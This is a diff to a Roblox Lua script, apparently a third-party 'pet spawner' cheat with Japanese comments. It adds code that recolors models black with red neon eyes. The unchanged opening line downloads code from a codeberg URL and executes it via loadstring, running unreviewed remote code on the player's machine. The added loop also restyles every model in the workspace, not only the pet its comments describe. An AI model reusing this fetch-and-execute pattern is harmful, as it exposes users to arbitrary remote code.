@@ -1,2 +1,40 @@
 local Spawner = loadstring(game:HttpGet("https://codeberg.org/DarkBackup/script/raw/branch/main/loadstring"))()
 Spawner.Load()
+
+-- 処理実行まで少し待機（Spawnerがペットを出す時間）
+task.wait(2) -- 必要に応じて調整（2秒で足りなければ増やす）
+
+-- ペットの見た目を変更する関数
+local function applyDarkEyesStyle(petModel)
+	for _, part in ipairs(petModel:GetDescendants()) do
+		if part:IsA("BasePart") then
+			if part.Name:lower():find("eye") then
+				part.Material = Enum.Material.Neon
+				part.Color = Color3.fromRGB(255, 0, 0) -- 赤
+				part.Reflectance = 0.1
+			else
+				part.Material = Enum.Material.SmoothPlastic
+				part.Color = Color3.fromRGB(0, 0, 0) -- 黒
+				part.Reflectance = 0
+			end
+		elseif part:IsA("Decal") and part.Name:lower():find("eye") then
+			part.Transparency = 1
+		end
+	end
+end
+
+-- workspace内の全モデルに対して適用
+for _, model in ipairs(workspace:GetDescendants()) do
+	if model:IsA("Model") then
+		local hasPart = false
+		for _, child in ipairs(model:GetDescendants()) do
+			if child:IsA("BasePart") then
+				hasPart = true
+				break
+			end
+		end
+		if hasPart then
+			applyDarkEyesStyle(model)
+		end
+	end
+end
